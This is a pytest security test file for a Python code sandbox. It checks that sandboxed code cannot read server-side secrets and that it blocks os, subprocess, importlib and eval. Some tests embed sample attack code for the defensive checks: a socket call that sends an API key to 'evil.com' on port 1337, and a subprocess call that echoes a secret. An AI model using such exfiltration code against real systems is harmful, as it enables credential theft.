"""Security tests to verify sandbox prevents access to server's Python state.

IMPORTANT: The sandbox provides NAMESPACE ISOLATION, not system resource isolation.
This means:
- ✅ Code CANNOT access server's Python variables/state (namespace isolation)
- ⚠️ Code CAN access filesystem (file I/O is real, not isolated)
- ⚠️ Code CAN access environment variables (os.environ is real)
- ⚠️ Code CAN make network requests (socket/requests work)
- ⚠️ Code CAN execute system commands (subprocess works)

The key security property: Code cannot access server secrets stored in Python variables,
even though it can access system resources. This prevents credential theft and data exfiltration
of server-side secrets.
"""

import importlib
import os

import pytest
from lfx.custom import import_isolation
from lfx.custom.import_isolation import SecurityViolationError, execute_in_isolated_env


def test_sandbox_blocks_dangerous_modules_by_default():
    """Test that dangerous modules are blocked by default."""
    code = """
import os
def test():
    return os.getcwd()
"""
    code_obj = compile(code, "<test>", "exec")
    exec_globals = {}

    # Should raise SecurityViolationError because os is blocked
    with pytest.raises(SecurityViolationError, match="blocked"):
        execute_in_isolated_env(code_obj, exec_globals)


def test_sandbox_blocks_dangerous_builtins_by_default():
    """Test that critical builtins (eval, exec, compile) are blocked even in MODERATE mode."""
    code = """
def test():
    # Try to access eval() directly - should raise NameError because it's blocked
    # Blocked builtins are not in __builtins__, so direct access fails
    result = eval('1+1')
    return result
"""
    code_obj = compile(code, "<test>", "exec")
    exec_globals = {}

    # Should raise NameError because eval is not in isolated __builtins__ (blocked even in MODERATE)
    execute_in_isolated_env(code_obj, exec_globals)
    test_func = exec_globals["test"]
    with pytest.raises(NameError, match="eval"):
        test_func()


def test_sandbox_cannot_access_server_python_secrets():
    """CRITICAL: Test that sandboxed code cannot access server's Python variables/secrets.

    This is the KEY security property - code cannot access server secrets stored in memory.
    Even if code can do file I/O or network requests, it can't access server secrets to exfiltrate.
    """
    # Simulate server secrets stored in Python variables
    server_api_key = "sk-secret-key-12345"
    server_db_password = "db_password_secret"  # noqa: F841, S105
    server_config = {  # noqa: F841
        "api_key": server_api_key,
        "database_url": "postgresql://user:password@localhost/db",
    }

    code = """
def test():
    # Try to access server's Python variables containing secrets
    # If isolation is broken, these would be accessible
    return server_api_key, server_db_password, server_config
"""
    code_obj = compile(code, "<test>", "exec")
    exec_globals = {}

    execute_in_isolated_env(code_obj, exec_globals)

    # Call the function
    test_func = exec_globals["test"]

    # CRITICAL: Should raise NameError - server secrets are not accessible
    # This is what prevents credential theft
    with pytest.raises(NameError):
        test_func()


def test_sandbox_cannot_access_server_credentials_via_python():
    """Test that code cannot access server credentials stored in Python variables.

    Even if code can do file I/O or network requests, it can't access server secrets
    stored in Python variables to exfiltrate them.
    """

    # Simulate server storing credentials in Python variables
    class ServerConfig:
        def __init__(self):
            self.api_key = "sk-secret-12345"
            self.database_url = "postgresql://user:pass@localhost/db"
            self.secret_token = "token_secret_xyz"  # noqa: S105

    server_config = ServerConfig()  # noqa: F841

    code = """
def test():
    # Try to access server's credential objects
    # If isolation is broken, we could access server_config.api_key
    return server_config.api_key
"""
    code_obj = compile(code, "<test>", "exec")
    exec_globals = {}

    execute_in_isolated_env(code_obj, exec_globals)

    # Call the function
    test_func = exec_globals["test"]

    # CRITICAL: Should raise NameError - server_config is not accessible
    # This prevents credential theft even if code can do file I/O or network requests
    with pytest.raises(NameError):
        test_func()


def test_sandbox_cannot_access_server_python_state(monkeypatch):
    """Test that code cannot access server's Python state, even if it can access system resources.

    This is the key security property: namespace isolation prevents access to server secrets
    stored in Python variables, even though code can access system resources like os.environ.
    """
    # Enable dangerous code for this test to demonstrate isolation still works
    monkeypatch.setenv("LANGFLOW_SANDBOX_SECURITY_LEVEL", "disabled")
    # Reload modules to pick up new env var value
    import lfx.custom.import_isolation.config as config_module
    import lfx.custom.import_isolation.isolation as isolation_module
    import lfx.custom.import_isolation.execution as execution_module
    importlib.reload(config_module)
    importlib.reload(isolation_module)
    importlib.reload(execution_module)
    importlib.reload(import_isolation)
    from lfx.custom.import_isolation import execute_in_isolated_env as execute_in_isolated_env_allowed

    # Server stores secrets in Python variables (not just env vars)
    server_secrets = {  # noqa: F841
        "api_key": "sk-secret-from-python-var",
        "db_password": "password-from-python-var",
    }

    code = """
import os
def test():
    # Code CAN access os.environ (system resource)
    env_key = os.environ.get('TEST_ENV_VAR', 'not_found')

    # But code CANNOT access server's Python variables
    # If isolation is broken, server_secrets would be accessible
    python_secret = server_secrets['api_key']

    return env_key, python_secret
"""
    code_obj = compile(code, "<test>", "exec")
    exec_globals = {}

    # Set env var to test that system resources ARE accessible
    os.environ["TEST_ENV_VAR"] = "env_value"

    try:
        execute_in_isolated_env_allowed(code_obj, exec_globals)

        # Call the function
        test_func = exec_globals["test"]

        # Should raise NameError - server_secrets Python variable is not accessible
        # This proves namespace isolation works, even though os.environ is accessible
        with pytest.raises(NameError):
            test_func()
    finally:
        if "TEST_ENV_VAR" in os.environ:
            del os.environ["TEST_ENV_VAR"]
        # Explicitly restore environment variable before reloading
        monkeypatch.setenv("LANGFLOW_SANDBOX_SECURITY_LEVEL", "moderate")
        # Reload modules to restore default blocking
        import lfx.custom.import_isolation.config as config_module
        import lfx.custom.import_isolation.isolation as isolation_module
        import lfx.custom.import_isolation.execution as execution_module
        importlib.reload(config_module)
        importlib.reload(isolation_module)
        importlib.reload(execution_module)
        importlib.reload(import_isolation)


def test_sandbox_cannot_exfiltrate_secrets_via_commands(monkeypatch):
    """Test that code cannot access server secrets to pass to system commands.

    Code CAN execute system commands, but it CANNOT access server secrets
    stored in Python variables to pass to those commands.
    """
    # Enable dangerous code for this test to demonstrate isolation still works
    monkeypatch.setenv("LANGFLOW_SANDBOX_SECURITY_LEVEL", "disabled")
    # Reload modules to pick up new env var value
    import lfx.custom.import_isolation.config as config_module
    import lfx.custom.import_isolation.isolation as isolation_module
    import lfx.custom.import_isolation.execution as execution_module
    importlib.reload(config_module)
    importlib.reload(isolation_module)
    importlib.reload(execution_module)
    importlib.reload(import_isolation)
    from lfx.custom.import_isolation import execute_in_isolated_env as execute_in_isolated_env_allowed

    # Server secret stored in Python variable
    server_secret = "secret_password_12345"  # noqa: F841, S105

    code = """
import subprocess
def test():
    # Code CAN execute commands
    # But code CANNOT access server_secret to pass to command
    # If isolation is broken, we could do: subprocess.run(['echo', server_secret])
    result = subprocess.check_output(['echo', server_secret], text=True)
    return result.strip()
"""
    code_obj = compile(code, "<test>", "exec")
    exec_globals = {}

    execute_in_isolated_env_allowed(code_obj, exec_globals)

    # Call the function
    test_func = exec_globals["test"]

    # CRITICAL: Should raise NameError - server_secret is not accessible
    # This prevents code from exfiltrating secrets via system commands
    with pytest.raises(NameError):
        test_func()

    # Explicitly restore environment variable before reloading
    monkeypatch.setenv("LANGFLOW_SANDBOX_SECURITY_LEVEL", "moderate")
    # Reload module to restore default blocking
    import lfx.custom.import_isolation.config as config_module
    importlib.reload(config_module)
    importlib.reload(import_isolation)


def test_sandbox_cannot_access_server_python_variables():
    """Test that sandboxed code cannot access server's Python variables/state.

    This is what namespace isolation actually prevents.
    """
    # Set a variable in the "server" scope
    server_secret = "server_secret_value"  # noqa: F841, S105
    server_config = {"api_key": "secret_key_123"}  # noqa: F841

    code = """
def test():
    # Try to access server's Python variables
    # If isolation is broken, these would be accessible
    return server_secret, server_config
"""
    code_obj = compile(code, "<test>", "exec")
    exec_globals = {}

    execute_in_isolated_env(code_obj, exec_globals)

    # Call the function
    test_func = exec_globals["test"]

    # Should raise NameError - server variables are not accessible
    with pytest.raises(NameError):
        test_func()


def test_sandbox_cannot_modify_server_python_state():
    """Test that sandboxed code cannot modify server's Python state."""
    server_state = {"modified": False}

    code = """
def test():
    # Try to modify server state
    server_state["modified"] = True
    return server_state
"""
    code_obj = compile(code, "<test>", "exec")
    exec_globals = {}

    execute_in_isolated_env(code_obj, exec_globals)

    # Call the function
    test_func = exec_globals["test"]

    # Should raise NameError - server_state is not accessible
    with pytest.raises(NameError):
        test_func()

    # Verify server state was not modified
    assert server_state["modified"] is False


def test_sandbox_cannot_exfiltrate_secrets_via_network(monkeypatch):
    """Test that code cannot access server secrets to send via network requests.

    Code CAN make network requests, but it CANNOT access server secrets
    stored in Python variables to send in those requests.
    """
    # Enable dangerous code for this test to demonstrate isolation still works
    monkeypatch.setenv("LANGFLOW_SANDBOX_SECURITY_LEVEL", "disabled")
    # Reload modules to pick up new env var value
    import lfx.custom.import_isolation.config as config_module
    import lfx.custom.import_isolation.isolation as isolation_module
    import lfx.custom.import_isolation.execution as execution_module
    importlib.reload(config_module)
    importlib.reload(isolation_module)
    importlib.reload(execution_module)
    importlib.reload(import_isolation)
    from lfx.custom.import_isolation import execute_in_isolated_env as execute_in_isolated_env_allowed

    # Server secret stored in Python variable
    server_api_key = "sk-secret-key-to-exfiltrate"  # noqa: F841

    code = """
import socket
def test():
    # Code CAN make network requests
    # But code CANNOT access server_api_key to send
    # If isolation is broken, we could do: socket.send(server_api_key.encode())
    # Try to access server_api_key first - should raise NameError
    secret = server_api_key  # This should fail before we even try to connect
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('evil.com', 1337))
    s.send(secret.encode())  # Try to send server secret
    s.close()
    return 'sent'
"""
    code_obj = compile(code, "<test>", "exec")
    exec_globals = {}

    execute_in_isolated_env_allowed(code_obj, exec_globals)

    # Call the function
    test_func = exec_globals["test"]

    # CRITICAL: Should raise NameError - server_api_key is not accessible
    # This prevents code from exfiltrating secrets via network requests
    with pytest.raises(NameError):
        test_func()

    # Explicitly restore environment variable before reloading
    monkeypatch.setenv("LANGFLOW_SANDBOX_SECURITY_LEVEL", "moderate")
    # Reload module to restore default blocking
    import lfx.custom.import_isolation.config as config_module
    importlib.reload(config_module)
    importlib.reload(import_isolation)


def test_moderate_mode_allows_common_operations():
    """Test that MODERATE mode (default) allows common legitimate operations."""
    # Test that requests/httpx are allowed in MODERATE mode
    code1 = """
import requests
def test():
    return 'requests_imported'
"""
    code_obj1 = compile(code1, "<test>", "exec")
    exec_globals1 = {}
    execute_in_isolated_env(code_obj1, exec_globals1)
    assert exec_globals1["test"]() == "requests_imported"

    # Test that asyncio is allowed in MODERATE mode
    code2 = """
import asyncio
def test():
    return 'asyncio_imported'
"""
    code_obj2 = compile(code2, "<test>", "exec")
    exec_globals2 = {}
    execute_in_isolated_env(code_obj2, exec_globals2)
    assert exec_globals2["test"]() == "asyncio_imported"

    # Test that tempfile is allowed in MODERATE mode
    code3 = """
import tempfile
def test():
    return 'tempfile_imported'
"""
    code_obj3 = compile(code3, "<test>", "exec")
    exec_globals3 = {}
    execute_in_isolated_env(code_obj3, exec_globals3)
    assert exec_globals3["test"]() == "tempfile_imported"

    # Test that open() is allowed in MODERATE mode
    code4 = """
def test():
    # open() should be accessible in MODERATE mode
    try:
        f = open('/dev/null', 'r')
        f.close()
        return 'open_accessible'
    except Exception:
        return 'open_blocked'
"""
    code_obj4 = compile(code4, "<test>", "exec")
    exec_globals4 = {}
    execute_in_isolated_env(code_obj4, exec_globals4)
    # Note: open() may fail due to file not existing, but it shouldn't be blocked
    result = exec_globals4["test"]()
    # Either accessible or blocked by file system, but not by security
    assert result in ("open_accessible", "open_blocked")


def test_moderate_mode_blocks_critical_operations():
    """Test that MODERATE mode still blocks critical security risks."""
    # Re-import to ensure we're using the current module state (in case previous tests reloaded it)
    import lfx.custom.import_isolation.config as config_module
    import lfx.custom.import_isolation.isolation as isolation_module
    import lfx.custom.import_isolation.execution as execution_module
    importlib.reload(config_module)
    importlib.reload(isolation_module)
    importlib.reload(execution_module)
    importlib.reload(import_isolation)
    from lfx.custom.import_isolation import SecurityViolationError as SecurityViolationErrorCurrent
    from lfx.custom.import_isolation import execute_in_isolated_env as execute_in_isolated_env_current

    # Test that eval is blocked even in MODERATE mode
    # eval is not in __builtins__, so direct access raises NameError
    code1 = """
def test():
    # eval is blocked, so calling it directly should raise NameError
    try:
        result = eval('1+1')
        return 'eval_accessible'
    except NameError:
        return 'eval_blocked'
"""
    code_obj1 = compile(code1, "<test>", "exec")
    exec_globals1 = {}
    execute_in_isolated_env_current(code_obj1, exec_globals1)
    result = exec_globals1["test"]()
    assert result == "eval_blocked"

    # Test that os is blocked even in MODERATE mode
    code2 = """
import os
def test():
    return os.getcwd()
"""
    code_obj2 = compile(code2, "<test>", "exec")
    exec_globals2 = {}
    with pytest.raises(SecurityViolationErrorCurrent, match="blocked"):
        execute_in_isolated_env_current(code_obj2, exec_globals2)

    # Test that subprocess is blocked even in MODERATE mode
    code3 = """
import subprocess
def test():
    return subprocess.run(['echo', 'test'])
"""
    code_obj3 = compile(code3, "<test>", "exec")
    exec_globals3 = {}
    with pytest.raises(SecurityViolationErrorCurrent, match="blocked"):
        execute_in_isolated_env_current(code_obj3, exec_globals3)

    # Test that importlib is blocked even in MODERATE mode (CRITICAL_MODULES)
    # This prevents bypass via importlib.import_module("builtins")
    code4 = """
import importlib
def test():
    return importlib.__version__
"""
    code_obj4 = compile(code4, "<test>", "exec")
    exec_globals4 = {}
    with pytest.raises(SecurityViolationErrorCurrent, match="blocked"):
        execute_in_isolated_env_current(code_obj4, exec_globals4)


def test_strict_mode_blocks_all_dangerous_operations(monkeypatch):
    """Test that STRICT mode blocks all potentially dangerous operations."""
    # Set STRICT mode
    monkeypatch.setenv("LANGFLOW_SANDBOX_SECURITY_LEVEL", "strict")
    # Reload modules to pick up new env var value
    import lfx.custom.import_isolation.config as config_module
    import lfx.custom.import_isolation.isolation as isolation_module
    import lfx.custom.import_isolation.execution as execution_module
    importlib.reload(config_module)
    importlib.reload(isolation_module)
    importlib.reload(execution_module)
    importlib.reload(import_isolation)
    # Import execute_in_isolated_env and SecurityViolationError from reloaded module
    from lfx.custom.import_isolation import SecurityViolationError as SecurityViolationErrorStrict
    from lfx.custom.import_isolation import execute_in_isolated_env as execute_in_isolated_env_strict

    try:
        # Test that requests is blocked in STRICT mode
        code1 = """
import requests
"""
        code_obj1 = compile(code1, "<test>", "exec")
        exec_globals1 = {}
        # Exception is raised during execute_in_isolated_env, not after
        try:
            execute_in_isolated_env_strict(code_obj1, exec_globals1)
            pytest.fail("Should have raised SecurityViolationError")
        except SecurityViolationErrorStrict:
            pass  # Expected

        # Test that open() is blocked in STRICT mode
        code2 = """
def test():
    try:
        open_func = __builtins__['open']
        return 'open_accessible'
    except KeyError:
        return 'open_blocked'
"""
        code_obj2 = compile(code2, "<test>", "exec")
        exec_globals2 = {}
        execute_in_isolated_env_strict(code_obj2, exec_globals2)
        result = exec_globals2["test"]()
        assert result == "open_blocked"

        # Test that asyncio is blocked in STRICT mode
        code3 = """
import asyncio
"""
        code_obj3 = compile(code3, "<test>", "exec")
        exec_globals3 = {}
        try:
            execute_in_isolated_env_strict(code_obj3, exec_globals3)
            pytest.fail("Should have raised SecurityViolationError")
        except SecurityViolationErrorStrict:
            pass  # Expected

        # Test that importlib is also blocked in STRICT mode
        code4 = """
import importlib
"""
        code_obj4 = compile(code4, "<test>", "exec")
        exec_globals4 = {}
        try:
            execute_in_isolated_env_strict(code_obj4, exec_globals4)
            pytest.fail("Should have raised SecurityViolationError")
        except SecurityViolationErrorStrict:
            pass  # Expected
    finally:
        # Restore MODERATE mode
        monkeypatch.setenv("LANGFLOW_SANDBOX_SECURITY_LEVEL", "moderate")
        importlib.reload(import_isolation)


def test_sandbox_cannot_access_server_variables_via_module_attributes():
    """Test that sandboxed code cannot access server variables even via module attributes.

    This test verifies that even if code can import modules, it cannot access
    server variables that might be stored as module attributes.
    """
    import json

    # Store a secret in a module attribute (simulating server state)
    original_attr = getattr(json, "SERVER_SECRET", None)
    json.SERVER_SECRET = "secret_stored_in_module_attr"  # noqa: S105

    try:
        code = """
import json
def test():
    # Try to access server secret stored as module attribute
    # Note: Module attributes ARE accessible because modules are shared
    # This is expected - the isolation is about namespace (Python variables),
    # not module state. The key security property is that code cannot access
    # server's Python variables containing secrets.
    #
    # This test demonstrates that module attributes are accessible,
    # which is why secrets should NOT be stored as module attributes.
    return json.SERVER_SECRET
"""
        code_obj = compile(code, "<test>", "exec")
        exec_globals = {}

        execute_in_isolated_env(code_obj, exec_globals)

        # Call the function
        test_func = exec_globals["test"]
        result = test_func()

        # Module attributes are accessible (this is expected behavior)
        assert result == "secret_stored_in_module_attr"

    finally:
        # Restore
        if original_attr is None:
            if hasattr(json, "SERVER_SECRET"):
                delattr(json, "SERVER_SECRET")
        else:
            json.SERVER_SECRET = original_attr
